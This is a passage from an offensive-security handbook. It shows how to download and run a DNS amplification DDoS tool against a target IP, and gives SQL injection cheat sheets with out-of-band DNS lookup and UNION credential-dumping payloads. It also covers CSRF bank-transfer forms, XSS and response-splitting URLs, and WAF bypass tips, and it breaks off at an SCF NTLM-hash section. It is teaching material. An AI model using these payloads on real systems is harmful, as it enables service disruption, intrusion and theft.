<h3 id="executing-the-attack"><a class="header" href="#executing-the-attack">Executing the attack</a></h3>
<p>A simple tool is available only as a proof of concept <a href="https://github.com/rodarima/lsi/blob/master/entrega/p2/dnsdrdos.c">here</a>. You will need to download and then compile it:</p>
<pre><code class="language-bash">wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
</code></pre>
<pre><code class="language-bash">gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
</code></pre>
<pre><code class="language-bash">┌──(cr0mll@kali)-[~/MHN/DNS]-[]
└─\\(  wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
--2021-09-21 13:01:11--  https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15109 (15K) [text/plain]
Saving to: ‘dnsdrdos.c’

dnsdrdos.c                                                  100%[========================================================================================================================================&gt;]  14.75K  --.-KB/s    in 0.001s  

2021-09-21 13:01:11 (17.9 MB/s) - ‘dnsdrdos.c’ saved [15109/15109]

┌──(cr0mll@kali)-[~/MHN/DNS]-[]
└─ \\) gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
</code></pre>
<p>Now, create a file containing the IP's of each DNS server you want to use in the attack (only one IP per line). Use the following syntax to run the attack:</p>
<pre><code class="language-bash">sudo ./dnsdrdos -f &lt;dns servers file&gt; -s &lt;target IP&gt; -d &lt;domain&gt; -l &lt;number of loops through the list&gt;
</code></pre>
<pre><code class="language-bash">┌──(cr0mll@kali)-[~/MHN/DNS]-[]
└─\\(  sudo ./dnsdrdos -f dns_servers -s 192.168.129.2 -d nsa.gov -l 30
-----------------------------------------------    
dnsdrdos - by noptrix - http://www.noptrix.net/    
-----------------------------------------------

┌──(cr0mll@kali)-[~/MHN/DNS]-[]
└─ \\)
</code></pre>
<p>The output may be empty, but the packets were sent. You can verify this with <code>wireshark</code>:</p>
<p><img src="Exploitation/DNS/Resources/Images/dnsdrdos-wireshark.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-metadata"><a class="header" href="#database-metadata">Database Metadata</a></h1>
<p>Database engines provide tables with the database's metadata. This metadata table is different for the different engines:</p>
<div class="table-wrapper"><table><thead><tr><th>Engine</th><th>Table Name</th></tr></thead><tbody>
<tr><td>SQLite</td><td>sqlite_master</td></tr>
<tr><td>MySQL</td><td>information_schema</td></tr>
<tr><td>PostgreSQL</td><td>information_schema</td></tr>
<tr><td>Oracle</td><td>dba_tables</td></tr>
</tbody></table>
</div>
<h2 id="database-version"><a class="header" href="#database-version">Database Version</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Database</th><th>Version Info</th></tr></thead><tbody>
<tr><td>Oracle</td><td><code>SELECT banner FROM v\\( version</code> <br> <code>SELECT version FROM v \\)instance</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
<tr><td>MySQL</td><td><code>SELECT @@version </code></td></tr>
</tbody></table>
</div>
<h2 id="database-contents"><a class="header" href="#database-contents">Database Contents</a></h2>
<p>Listing tables and the columns they contain:</p>
<div class="table-wrapper"><table><thead><tr><th>Database</th><th>Contents Info</th></tr></thead><tbody>
<tr><td>Oracle</td><td><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = 'Table Name'</code></td></tr>
<tr><td>Microsoft</td><td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
<tr><td>MySQL</td><td><code> SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
</tbody></table>
</div>
<h1 id="string-concatenation"><a class="header" href="#string-concatenation">String Concatenation</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Database</th><th>Concatenation</th></tr></thead><tbody>
<tr><td>Oracle</td><td>'a'||'b'</td></tr>
<tr><td>Microsoft</td><td>'a'+'b'</td></tr>
<tr><td>PostgreSQL</td><td>'a'||'b'</td></tr>
<tr><td>MySQL</td><td>'a' 'b' (space) or <code>CONCAT('a','b')</code></td></tr>
</tbody></table>
</div>
<h1 id="unconditional-time-delays"><a class="header" href="#unconditional-time-delays">Unconditional Time Delays</a></h1>
<p>Replace <code>delay</code> with the desired delay in seconds.
Database | Delay Syntax
---------| ------------
Oracle| <code>dbms_pipe.receive_message(('a'),delay)</code>
Microsoft| <code>WAITFOR DELAY 'hours:minutes:seconds'</code>
PostgreSQL| <code>SELECT pg_sleep(delay)</code>
MySQL| <code>SELECT sleep(delay)</code></p>
<h1 id="dns-lookups"><a class="header" href="#dns-lookups">DNS Lookups</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Database</th><th>Lookup Syntax</th></tr></thead><tbody>
<tr><td>Oracle</td><td><code>SELECT UTL_INADDR.get_host_address('domain')</code> - requires elevated privileges</td></tr>
<tr><td>Microsoft</td><td><code>exec master..xp_dirtree '//domain/a'</code></td></tr>
<tr><td>PostgreSQL</td><td><code>copy (SELECT '') to program 'nslookup domain</code></td></tr>
<tr><td>MySQL</td><td>These work only on Windows <br> <code>LOAD_FILE('\\\\domain\\a')</code> <br> <code>SELECT ... INTO OUTFILE '\\\\domain\a'</code></td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="network-layer-defences"><a class="header" href="#network-layer-defences">Network Layer Defences</a></h1>
<p>A web application firewall (WAF) can be configured to drop certain requests that look suspicious.</p>
<p>Common bypasses:</p>
<ul>
<li>inserting comments</li>
<li>changing character case</li>
<li>using synonyms of symbols (= equals)</li>
</ul>
<h1 id="application-layer-defences"><a class="header" href="#application-layer-defences">Application Layer Defences</a></h1>
<ol>
<li>Do not write dynamic queries</li>
<li>Sanitise user input</li>
</ol>
<p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p>
<p>https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</p>
<h1 id="database-layer-defences"><a class="header" href="#database-layer-defences">Database Layer Defences</a></h1>
<ol>
<li>Update  DBMS</li>
<li>Minimise privileges</li>
<li>Proper login and monitoring </li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-11"><a class="header" href="#introduction-11">Introduction</a></h1>
<p>You can test for SQL injections by injecting a single quote (<code>'</code>) into any input fields or parameters which are sent to the server. Sometimes the server errors out and if proper error handling isn't implemented in the target application, the error my provide you with useful infomation such as the database engine, its version or even parts of the query into which you tried to inject.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-2"><a class="header" href="#overview-2">Overview</a></h1>
<p>SQL Injections allow an attacker to alter queries that an application sends to its database. This may enable the attacker to view data which they usually shouldn't have access to, edit this data arbitrarily, or modify the actual database in ways that they shouldn't be able to. In general, SQL injections could allow for the following:</p>
<ul>
<li>Reading sensitive data from a database</li>
<li>Modifying the database data with <code>insert</code>, <code>update</code>, or <code>delete</code> queries</li>
<li>Execution of privileged commands such as shutting the entire database down</li>
<li>Reading files from the file system that the database is stored on</li>
<li>Writing files into the file system</li>
<li>Execution of additional OS commands</li>
</ul>
<h1 id="types-of-sqli"><a class="header" href="#types-of-sqli">Types of SQLi</a></h1>
<ol>
<li>
<p>In-band - the attacker launches the attack and obtains the results through the same communication channel</p>
<ul>
<li>Error-based injections - retrieve information about the database, its structure and data, from error messages</li>
<li>Union-based injections - combine results from a legitimate query with those from the attack in order to obtain data</li>
</ul>
</li>
<li>
<p>Out-of-band - the results from the attack are exfiltrated using a different channel than the one the query was issued through</p>
<ul>
<li>Examples include creating an HTTP connection for sending results to a different web server or DNS tunneling</li>
<li>It requires specific extenstions to be enable in the database management software</li>
<li>The targated database server must be able to send outbound network requests without any restrictions</li>
</ul>
</li>
<li>
<p>Blind (Inferential) - they rely on changes in the behaviour with the database or application in order to extract information, since the actual data isn't sent back to the attacker</p>
<ul>
<li>usually detected through time delays or boolean conditions</li>
</ul>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-12"><a class="header" href="#introduction-12">Introduction</a></h1>
<p>Union injections allow you to retrieve information from other databases by injecting an additional <code>SELECT</code> query. The latter will append its results to the initial query.</p>
<p>Suppose you have an application which executes the following query:</p>
<pre><code class="language-sql">SELECT name, description FROM products WHERE category = 'food';
</code></pre>
<p>If an attacker can inject into the query, they could send the following input:</p>
<pre><code class="language-sql">' UNION SELECT username, password FROM users--
</code></pre>
<p>This would append the &quot;username&quot; and &quot;password&quot; columns of the <code>users</code> table respectively to the columns &quot;name&quot; and &quot;description&quot; from the original query.</p>
<h1 id="determining-the-amount-of-columns-returned"><a class="header" href="#determining-the-amount-of-columns-returned">Determining the amount of columns returned</a></h1>
<p>In a union injection, the number of columns in the injected query must match the number of columns in the original query. You can determine the number of columns by using the following query and keep appending <code>NULL</code>s until you observe a change in behaviour:</p>
<pre><code class="language-sql">UNION SELECT NULL--
</code></pre>
<pre><code class="language-sql">UNION SELECT NULL, NULL --
</code></pre>
<p>And so on.</p>
<h1 id="searching-for-columns-which-return-entries-of-a-particular-type"><a class="header" href="#searching-for-columns-which-return-entries-of-a-particular-type">Searching for columns which return entries of a particular type</a></h1>
<p>Once you have determined the amount of columns, you can look for columns that contain entries of a specific type. Suppose the original query has 3 columns.</p>
<pre><code class="language-sql">UNION SELECT NULL, NULL, NULL --
</code></pre>
<p>You can start replacing the <code>NULL</code>s one by one with a random string of text enclosed in quotation marks until you observe a change in behaviour:</p>
<pre><code class="language-sql">UNION SELECT 'random text', NULL, NULL --
</code></pre>
<pre><code class="language-sql">UNION SELECT NULL, 'random text', NULL --
</code></pre>
<p>And so on.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-3"><a class="header" href="#overview-3">Overview</a></h1>
<p>Certain vulnerabilities allow the attacker to input encoded characters that possess special meanings in HTML and HTTP responses. Usually, such input is sanitised by the application, however, sometimes application developers simply forget to implement sanitisation or don't do it properly. </p>
<p>Carriage Return (CR - \r) and Line Feed (LF - \n) can be represented with the following encodings, respectively - <code>%0D</code> and <code>%0A</code>.</p>
<p>CRLF injection occurs when a user manages to submit a CRLF (a new line) into an application. These vulnerabilities might be pretty minor, but might also be rather critical. The most common CRLF injections include injecting content into files on the server-side such as log files. Through cleverly crafted messages, an attacker could add fake error entries to a log and therefore make a system admin spend time looking for an issue that doesn't exist. This isn't really powerful in itself and is rather akin to pure trolling. Sometimes, however, CRLF may lead to <a href="Exploitation/Web/HTTP%20Response%20Splitting.html">HTTP Response Splitting</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-4"><a class="header" href="#overview-4">Overview</a></h1>
<p>Cross-Site Request Forgery (CSRF) is a type of attack used to trick the victim into sending a malicious request. It utilises the identity and privileges of the target in order to perform an undesired action on the victim's behalf. It is similar to indirect impersonation - you can make the victim's browser submit requests as the victim. It is called &quot;cross-site&quot; because a malicious website can make the victim's browser send a request to another website. </p>
<p>This attack typically relies on the victim being authenticated - either through cookies or basic header authorization.</p>
<h1 id="how-does-it-work-1"><a class="header" href="#how-does-it-work-1">How does it work</a></h1>
<p>There are two primary types of CSRF - through <code>GET</code> requests and through <code>POST</code> requests (although methods like <code>PUT</code> and <code>DELETE</code> may also be exploitable). </p>
<p>When your browser submits a request to a web server, it also sends along all stored cookies. If CSRF occurs, any authentication cookies will be sent with the request and as such, any actions on the server would be performed on the victim's behalf. Note that in order for CSRF to work, the victim needs to be logged in because when you make a log out request, the web server usually returns an HTTP response which auto-expires your authentication cookies and they are no longer valid.</p>
<p>In order for it to work, the victim would need to visit your malicious website.</p>
<h2 id="the-get-scenario"><a class="header" href="#the-get-scenario">The GET scenario</a></h2>
<p>This typically relies on hidden images through the HTML <code>&lt;img&gt;</code> tag. This tag takes an <code>src</code> attribute which will tell the victim's browser to perform a <code>GET</code> request to the specified URL in order to retrieve an image. However, an attacker can change this URL and even add parameters to it, so that the browser performs a <code>GET</code> request to any arbitrary site. </p>
<p>An example of such a malicious hidden image could be this:</p>
<pre><code class="language-html">&lt;img src=&quot;http://bank.com/transfer?recipient=John&amp;amount=1000&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot;&gt;
</code></pre>
<p>When visiting your malicious site, this will make the victim's browser submit a <code>GET</code> request. Any cookies stored for <code>bank.com</code> would be sent along, including any authentication ones. As such, the bank would complete the transfer from the victim's account.</p>
<h2 id="the-post-scenario"><a class="header" href="#the-post-scenario">The POST scenario</a></h2>
<p>If the bank uses <code>POST</code> requests for transfers, the <code>&lt;img&gt;</code> method won't work because image tags can't initiate <code>POST</code> requests. This can however be achieved through hidden forms.</p>
<pre><code class="language-html">&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;  
&lt;form method='POST' action='http://bank.com/transfer' target=&quot;csrf-frame&quot;  
id=&quot;csrf-form&quot;&gt;  
	&lt;input type='hidden' name='recipient' value='John'&gt;  
	&lt;input type='hidden' name='amount' value='1000'&gt;  
	&lt;input type='submit' value='submit'&gt;  
&lt;/form&gt;  
&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;
</code></pre>
<p>Normally, the submition of the form will require that a user clicks the submit button, but this can be automated through Javascript. The response from the submission of the <code>POST</code> request would be redirect to the non-displayed iframe and so the victim would never see what has happened.</p>
<h1 id="preventions"><a class="header" href="#preventions">Preventions</a></h1>
<h2 id="csrf-tokens"><a class="header" href="#csrf-tokens">CSRF Tokens</a></h2>
<p>Sometimes, websites will make use of two-part tokens called CSRF tokens in order to prevent cross-site request forgery. These tokens are generated on the server - one part is sent to the user and the other is kept private. This value is submitted with the request and validated on the server. If the CSRF token isn't correct, the server shouldn't fulfill the submission.</p>
<p>These tokens may be part of the <code>POST</code> request's body or as custom HTTP headers. They may take on any name, but some common ones include <code>CSRF</code>, <code>CSRFToken</code>, <code>X-CSRF-TOKEN</code>, <code>form-id</code>, <code>lt</code>, <code>lia-token</code>, etc.</p>
<p>You should always try removing or altering the CSRF token in order to check if it's properly implemented.</p>
<h2 id="cors"><a class="header" href="#cors">CORS</a></h2>
<p>When a browser sends an<br />
<code>application/json</code> <code>POST</code> request to a site, it will send an <code>OPTIONS</code>  request beforehand. The site then returns a<br />
response indicating which types of HTTP<br />
requests the server accepts and from what trusted origins. Such <code>OPTIONS</code> requests are called <em>preflight</em> <code>OPTIONS</code> requests.</p>
<p>CORS, or Cross-Origin Resource Sharing, restricts resource access, including JSON response access, from domains outside the one which served a file is allowed by the site being tested. When CORS is used, submitting <code>application/json</code> requests are not possible, unless the website explicitly allows them. </p>
<p>These protections can sometimes be bypassed by changing the <code>content-type</code> header to <code>application/x-   www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>. Browsers don't send preflight <code>OPTIONS</code> requests for any of these content types and CSRF requests might succeed.</p>
<h2 id="origin-and-referer-headers"><a class="header" href="#origin-and-referer-headers">Origin and Referer Headers</a></h2>
<p>Checking the <code>Origin</code> and <code>Referer</code> headers (if the origin header isn't present) prevents CSRF because these headers are controlled by the browsers and cannot be altered by the attacker</p>
<h2 id="samesite-cookie-attribute"><a class="header" href="#samesite-cookie-attribute">samesite Cookie Attribute</a></h2>
<p>This attribute can take on the values <code>strict</code> or <code>lax</code>. When set to <code>strict</code>,  the browser won't send that specific cookie with any request that doesn't originate from the correct website - including <code>GET</code> requests.</p>
<p>Setting the attribute to <code>lax</code> will prevent the cookie from being sent on normal subrequests (such as loading images or frames), however, the cookie will still be sent with direct requests to the origin site (such as those initiated by clicking on a link).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-5"><a class="header" href="#overview-5">Overview</a></h1>
<p>Cross-site scripting (XSS) describes the set of attacks where the attacker injects Javascript into a web application, typically because user input isn't properly sanitised. It is similar to HTML injection, however, it allows for the execution of Javascript code and that makes it a potentially critical vulnerability.</p>
<p>XSS vulnerabilities can be exploited in three major ways:</p>
<ul>
<li>stored (persistent) XSS</li>
<li>reflected XSS</li>
<li>DOM-based XSS</li>
</ul>
<p>These attacks usually require user interaction.</p>
<h1 id="reflected-xss"><a class="header" href="#reflected-xss">Reflected XSS</a></h1>
<p>Reflected XSS occurs when an application receives data which it then includes in its reply to the submitted HTTP request. This is typically exploited by creating a malicious link containing a script inside it and then tricking a user into clicking visiting that URL.</p>
<p>This type of XSS allows the attacker to perform any action on the application as the target. It is commonly used for stealing non-<code>httponly</code> cookies.</p>
<p>Suppose you have a search bar somewhere in your application, the contents of which are sent as a URL parameter in a <code>GET</code> request when a user clicks the search button and are then displayed on the response page in a similar manner:</p>
<pre><code>Search results for: &lt;search text&gt;
</code></pre>
<p>The request could be to the following example URL:</p>
<pre><code>example.com/?search=val
</code></pre>
<p>If your application is vulnerable to XSS, the attacker could craft a malicious URL like the following one:</p>
<pre><code>example.com/?search=&lt;script&gt;alert('test')&lt;/script&gt;
</code></pre>
<p>This would inject the Javascript as HTML into the <code>&lt;search text&gt;</code> on the response page and the browser would then execute the code.</p>
<h1 id="stored-xss"><a class="header" href="#stored-xss">Stored XSS</a></h1>
<p>Stored, or persistent, XSS is similar to reflected XSS, with the difference being that the injected code is actually stored onto the web server and then later distributed to anyone who requests the injected web page. This type of XSS is much more severe, since it can spread around. </p>
<p>Once Javascript has been injected and stored on the web server, the malicious Javascript will be delivered to and executed by any user who requests the specific web page.</p>
<h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-based XSS</a></h1>
<p>DOM-based XSS is a type of XSS where the malicious code is never sent to the server. This commonly occurs when using the fragment part of a URL, or by referencing <code>document.URL</code> / <code>document.location.href</code>.</p>
<p>This a less common attack nowadays, since most browser automatically escape Javascript in address bars, so DOM-based XSS will only work if you unescape it.</p>
<p>Suppose you have a page on </p>
<pre><code>http://127.0.0.1:8080/example.html
</code></pre>
<p>You can add fragments to the URL with a # symbol.</p>
<pre><code>http://127.0.0.1:8080/example.html#test=val
</code></pre>
<p>The fragment part (<code>#test=val</code>) is never sent to the server - it is only available locally.</p>
<p>Suppose you had the following client-side Javascript code running:</p>
<pre><code class="language-js">const pos = document.URL.indexOf(&quot;test=&quot;) + 5;
const value = document.URL.substring(document.URL.indexOf(&quot;test=&quot;) + 5, document.URL.length);

document.write(value);
</code></pre>
<p>An attacker could craft the following URL:</p>
<pre><code>http://127.0.0.1:8080/example.html#test=&lt;script&gt;alert('xss')&lt;/script&gt;
</code></pre>
<p>However, if a victim clicks on this link, no Javascript should be injected, since the browser would usually automatically escape it - you would get</p>
<pre><code>%3Cscript%3Ealert('xss')%3C/script%3E
</code></pre>
<p>printed on the page. If you, however, unescape the Javascript in your client-side code, it will get executed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-6"><a class="header" href="#overview-6">Overview</a></h1>
<p>HTTP Parameter Pollution describes the set of techniques used for manipulating how a server handles parameters in an HTTP request. This vulnerability may occur when duplicating or additional parameters are injected into an HTTP request and the website trusts them. Usually, HPP (HTTP Parameter Pollution) vulnerabilities depend on the way the server-side code handles parameters.</p>
<h1 id="server-side-hpp"><a class="header" href="#server-side-hpp">Server-Side HPP</a></h1>
<p>You send the server unexpected data, trying to make the server give an unexpected response. A simple example could be a bank transfer.</p>
<p>Suppose, your bank performs transfers on its website through the use of HTTP parameters. These could be a <code>recipient=</code> parameter for the receiving party, an <code>amount=</code> parameter for the amount to send in a specific currency, and a <code>sender=</code> parameter for the one who sends the money.</p>
<p>A URL for such a transfer could look like the following:</p>
<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl
</code></pre>
<p>It may be possible that the bank server assumes it will only ever receive a single <code>sender=</code> parameter, however, submitting two such parameters (like in the following URL), may result in unexpected behaviour:</p>
<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
</code></pre>
<p>An attacker could send such a request in hopes that the server will perform any validations with the first parameter and actually transfer the money from the second account specified. When different web servers see duplicate parameters, they handle them in <a href="Exploitation/Web/../../Web/Duplicate%20HTTP%20Parameter%20Handling.html">different ways</a>.</p>
<p>Even if a parameter isn't sent through the URL, inserting additional parameters may still cause unexpected server behaviour. This is especially the case with server code which handles parameters in arrays or vectors through indices. Inserting additional parameters at different places in the URL may cause reordering of the array values and lead to unexpected behaviour.</p>
<p>An example could be the following:</p>
<pre><code>https://www.bank.com/transfer?amount=1000&amp;recipient=ghijkl
</code></pre>
<p>The server would deduce the sender on the server-side instead of retrieving it from an HTTP request.</p>
<p>Normally, you wouldn't have access to the server code, but for a POC I have written a simple server in a pseudo-code (no particular language).</p>
<pre><code class="language-javascript">sender.id = abcdef

function init_transfer(params)
{
	params.push(sender.id) // the sender.id should be inserted at params[2]
	prepare_transfer(params)
}

function prepare_transfer(params)
{
	amount = params[0]
	recipient = params[1]
	sender = params[2]
	
	transfer(amount, recipient, sender)
}
</code></pre>
<p>Two functions are created here, <code>init_transfer</code> and <code>prepare_transfer</code> which takes a <code>params</code> vector. This function also later invokes a <code>transfer</code> function, the contents of which are currently out of scope. Following the above URL, the <code>amount</code> parameter be 1000, the recipient would be <code>ghijkl</code>. The <code>init_transfer</code> function adds the <code>sender.id</code> to the parameter array. Note, that the program expects the sender ID to be the 3rd (2nd index) parameter in the array in order to function properly. Finally, the transfer params array should look like this: <code>[1000, ghijkl, abcdef]</code>.</p>
<p>Now, an attacker could make a request to the following URL:</p>
<pre><code>https://www.bank.com/transfer?amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
</code></pre>
<p>In this case, <code>sender=</code> would be included into the parameter vector in its initial state (before the <code>init_transfer</code> function is invoked). This means that the <code>params</code> array would look like this: <code>[1000, ghijkl, ABCDEF]</code>. When <code>init_transfer</code> is called, the <code>sender.id</code> variable would be appended to the vector and so it would look like this: <code>[1000, ghijkl, ABCDEF, abcdef]</code>. Unfortunately, the server still expects that the correct sender would be located at <code>params[2]</code>, but that is no longer the case since we managed to insert another sender. As such, the money would be withdrawn from <code>ABCDEF</code> and not <code>abcdef</code>.</p>
<h1 id="client-side-hpp"><a class="header" href="#client-side-hpp">Client-Side HPP</a></h1>
<p>These vulnerabilities allow the attacker to inject extra parameters in order to alter the client-side. An example of this is included in the following presentation: https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf.</p>
<p>The example URL is</p>
<pre><code>http://host/page.php?par=123%26action=edit
</code></pre>
<p>The example server code is the following:</p>
<pre><code class="language-php">&lt;? \\( val=htmlspecialchars( \\)_GET['par'],ENT_QUOTES); ?&gt;  
&lt;a href=&quot;/page.php?action=view&amp;par='.&lt;?=\\( val?&gt;.'&quot;&gt;View Me!&lt;/a&gt;
</code></pre>
<p>Here, a new URL is generated based on the value of a parameter <code> \\)val</code>. Here, the attacker passes the value <code>123%26action=edit</code> onto the parameter. The URL-encoded value for <code>&amp;</code> is <code>%26</code>. When this gets to the <code>htmlspecialchars</code> function, the <code>%26</code> gets converted to an <code>&amp;amp;</code>. When the URL gets formed, it becomes</p>
<pre><code class="language-html">&lt;a href=&quot;/page.php?  
action=view&amp;par=123&amp;amp;action=edit&quot;&gt;
</code></pre>
<p>And since this is view as HTML, an additional parameter has been smuggled! The link would be equivalent to </p>
<pre><code>/page.php?  
action=view&amp;par=123&amp;action=edit
</code></pre>
<p>This second action parameter could cause unexpected behaviour based on how the server handles duplicate requests.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-13"><a class="header" href="#introduction-13">Introduction</a></h1>
<p>HTTP Response Splitting occurs when user-provided input isn't sanitised and CRLFs are injected into HTTP responses. This is usually done through URL parameters. This type of attack typically requires social engineering or at least some user interaction.</p>
<p>HTTP responses consist of message headers and a message body. The headers are separated from the body with 2 CRLFs - <code>\r\n\r\n</code>. An attacker could inject this character sequence into a header and terminate the header section - this could result in XSS, since anything after the 2 CRLFs will be treated as HTML.</p>
<p>Imagine a custom header <code>X-Name: Bob</code> which is set via a parameter in a <code>GET</code> request called <code>name</code>. If input isn't properly sanitised, an attacker could craft the following URL which would result in XSS:</p>
<pre><code class="language-html">?name=Bob%0d%0a%0d%0a&lt;script&gt;alert(document.domain)&lt;/script&gt;
</code></pre>
<p>In other cases, HTTP response splitting may be used to send two responses to a single request by injecting the second response into the first one. A URL like the following could change the contents of a legitimate page that the target visits:</p>
<pre><code class="language-html">application.com/redir.php?lang=hax%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%d%aContent-Length:%2019%0d%0a&lt;html&gt;Hacked&lt;/html&gt;
</code></pre>
<p>All the target needs to do, is visit the URL.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-7"><a class="header" href="#overview-7">Overview</a></h1>
<p>Open redirect vulnerabilities occur when a target visits a website which sends their browser to another URL. These attacks only redirect users and as such are often considered to be of low severity. </p>
<h1 id="how-do-they-work"><a class="header" href="#how-do-they-work">How Do They Work</a></h1>
<p>Open redirects occur when a developer mistrusts user input, which redirects to another site, usually via a URL<br />
parameter, HTML <code>&lt;meta&gt;</code> tags, or the DOM window<br />
location property.</p>
<h2 id="url-parameter-redirect"><a class="header" href="#url-parameter-redirect">URL Parameter Redirect</a></h2>
<p>Suppose that Google could redirect users to their Gmail service via the following URL:</p>
<pre><code>https://www.google.com/?redirect_to=https://www.gmail.com
</code></pre>
<p>In this case, visiting <code>www.google.com</code> would result in your browser sending an HTTP request to the Google web server. The server would process this request and return a status code - typically 302, although it may sometimes be 301, 303, 307, or 308. This code would inform the browser that the page has been found, however, it would also tell it to make an additional HTTP request to <code>www.gmail.com</code>. This will be noted in the <code>Location:</code> header of the HTTP response. This header specifies where to redirect <code>GET</code> requests. An attacker could change the value of the <code>redirect_to</code> parameter and forward you to their malicious server.</p>
<p>Common redirection parameter names include <code>url=</code>, <code>redirect=</code>, <code>next=</code>, however, they may also be denoted by a single letter at times.</p>
<h2 id="meta-refresh-tag-redirect"><a class="header" href="#meta-refresh-tag-redirect">Meta Refresh Tag Redirect</a></h2>
<p>HTML <code>&lt;meta&gt;</code> tags can tell a browser to reload a page and make a <code>GET</code> request to a specified URL. This URL is defined in the tag's <code>content</code> attribute.</p>
<p>This is an example of such a tag:
<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=https://www.google.com/&quot;&gt;</code></p>
<p>First, the <code>content</code> attribute defines the number of seconds the browser should wait before making the request to the URL. Secondly, it specifies the URL to make the request to.</p>
<h2 id="javascript-redirect"><a class="header" href="#javascript-redirect">Javascript Redirect</a></h2>
<p>Open redirects can be exploited by modifying the window's <code>location</code> property through the Document Object Model. This property denotes where a request should be redirected to.</p>
<p>An attacker may change the <code>location</code> property through any of the following ways:</p>
<pre><code class="language-javascript">window.location = https://www.google.com/  
window.location.href = https://www.google.com  
window.location.replace(https://www.google.com)
</code></pre>
<p>This type of open redirect is usually chained with some sort of XSS.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-8"><a class="header" href="#overview-8">Overview</a></h1>
<p>Template Injection occurs when an attacker injects malicious template code into an input field and the templating engine doesn't sanitise the input. As such, the expression provided by the attacker may be evaluated and can lead to all sorts of nasty vulnerabilities such as RCE.</p>
<h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server-Side Template Injection</a></h1>
<p>SSTI occurs when the injection happens on the server-side. Templating engines are associated with different programming languages, so you might be able to execute code in that language when SSTI occurs.</p>
<p>Testing for SSTI is template engine-dependent because different engines make use of a different syntax. It is, however, common to see templates enclosed in two pairs of <code>{{}}</code>. </p>
<p>You should look for places in a webpage where user input is reflected. If you inject <code>{{7*'7'}}</code> and see <code>49</code> or <code>7777777</code> somewhere, then you know you have SSTI. This syntax isn't standard. You will need to identify the running template engine and use the correct syntax.</p>
<h1 id="client-side-template-injection"><a class="header" href="#client-side-template-injection">Client-Side Template Injection</a></h1>
<p>This vulnerability occurs in client template engines, which are written in Javascript. Such engines are Google's AngularJS and Facebook's ReactJS.</p>
<p>CSTI typically occur in browser, so they typically cannot be used for RCE, but may be exploited for XSS. This can be difficult, since most engines do a good job at sanitising input and preventing XSS.</p>
<p>When interacting with ReactJS, you should look for <code>dangerouslySetInnerHTML</code> function calls where you can modify the input. This function intentionally bypasses React's XSS protections.</p>
<p>AngularJS versions before 1.6 include a sandbox in order to limit the available Javascript functions, but bypasses have been found. You can check the AngularJS version by typing <code>Angular.version</code> in the developer console. A list of bypasses can be found at https://pastebin.com/xMXwsm0N, however, more are surely available online.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows"><a class="header" href="#windows">Windows</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-14"><a class="header" href="#introduction-14">Introduction</a></h1>
<p>Shell Command Files (SCF) permit a limited set of operations and are executed upon browsing to the location where they are stored. What makes them interesting is the fact that they can communicate through SMB, which means that it is possible to extract NTLM hashes from Windows hosts. This can be achieved if you are provided with write access to an SMB share. </p>
<h1 id="the-attack"><a class="header" href="#the-attack">The Attack</a></h1>
